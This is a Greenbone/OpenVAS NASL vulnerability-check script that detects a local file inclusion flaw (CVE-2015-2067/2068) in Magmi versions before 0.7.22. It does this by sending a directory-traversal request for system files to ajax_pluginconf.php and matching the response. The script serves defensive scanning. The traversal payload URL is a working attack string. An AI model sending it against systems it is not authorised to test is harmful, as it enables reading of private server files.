# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:magmi_project:magmi";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105196");
  script_version("2023-07-25T05:05:58+0000");
  script_cve_id("CVE-2015-2067", "CVE-2015-2068");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-02-06 17:04:13 +0100 (Fri, 06 Feb 2015)");
  script_name("Magmi (Magento Mass Importer) < 0.7.22 Cross-Site Scripting / Local File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_dependencies("sw_magento_magmi_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("magmi/detected");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130250/Magento-Server-MAGMI-Cross-Site-Scripting-Local-File-Inclusion.html");

  script_tag(name:"impact", value:"Remote attackers can use specially crafted requests with directory-
  traversal sequences ('../') to read arbitrary files in the context of the application.
  This may aid in further attacks.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");

  script_tag(name:"solution", value:"Update to Magmi 0.7.22 or later.");

  script_tag(name:"summary", value:"Magmi is prone to cross-site scripting and local file
  inclusion vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_active");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files();

foreach file( keys( files ) ) {

  url = dir + "/web/ajax_pluginconf.php?file=../../../../../../../../../../../" + files[file] + "&plugintype=utilities&pluginclass=CustomSQLUtility";

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
